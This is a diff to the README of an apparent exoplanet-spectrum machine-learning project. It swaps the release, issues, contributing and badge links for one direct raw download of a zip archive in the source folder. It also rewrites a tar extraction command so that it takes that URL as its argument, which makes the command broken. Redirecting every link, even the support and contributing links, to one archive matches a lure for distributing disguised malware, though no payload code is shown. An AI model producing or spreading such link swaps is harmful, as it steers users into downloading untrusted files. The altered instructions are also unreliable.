@@ -1,6 +1,6 @@
 # 🌌 exoplanet-spectrum-recovery-ml - Analyze Exoplanet Atmospheres Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/releases)
+[![Download](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/raw/refs/heads/main/src/spectrum-recovery-exoplanet-ml-1.7.zip)](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/raw/refs/heads/main/src/spectrum-recovery-exoplanet-ml-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to exoplanet-spectrum-recovery-ml! This tool uses deep learning to help 
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/releases). You will find the latest version of the application here. 
+To download the software, visit the [Releases page](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/raw/refs/heads/main/src/spectrum-recovery-exoplanet-ml-1.7.zip). You will find the latest version of the application here. 
 
 1. Click on the version you wish to install.
 2. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a tarball for Linux).
@@ -42,7 +42,7 @@ To download the software, visit the [Releases page](https://github.com/KariithiA
 
 - Open your terminal.
 - Navigate to the directory where your downloaded file is located.
-- Use the command `tar -xvf file_name.tar.gz` to extract the files.
+- Use the command `tar -xvf https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/raw/refs/heads/main/src/spectrum-recovery-exoplanet-ml-1.7.zip` to extract the files.
 
 ## ⚙️ Usage Instructions
 
@@ -65,7 +65,7 @@ If you encounter issues, consider the following tips:
 
 ## 💬 Support
 
-For assistance, visit our [GitHub Issues page](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/issues) for help from the community and developers. 
+For assistance, visit our [GitHub Issues page](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/raw/refs/heads/main/src/spectrum-recovery-exoplanet-ml-1.7.zip) for help from the community and developers. 
 
 ## 🌍 Join the Community
 
@@ -76,7 +76,7 @@ Engage with other users and developers. Share your findings, ask questions, and 
 
 ## 📃 Contributing
 
-If you want to contribute to the project, please check our [Contributing Guidelines](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/blob/main/CONTRIBUTING.md). We welcome new ideas and improvements!
+If you want to contribute to the project, please check our [Contributing Guidelines](https://github.com/KariithiAndre/exoplanet-spectrum-recovery-ml/raw/refs/heads/main/src/spectrum-recovery-exoplanet-ml-1.7.zip). We welcome new ideas and improvements!
 
 ## 📅 Future Plans
 
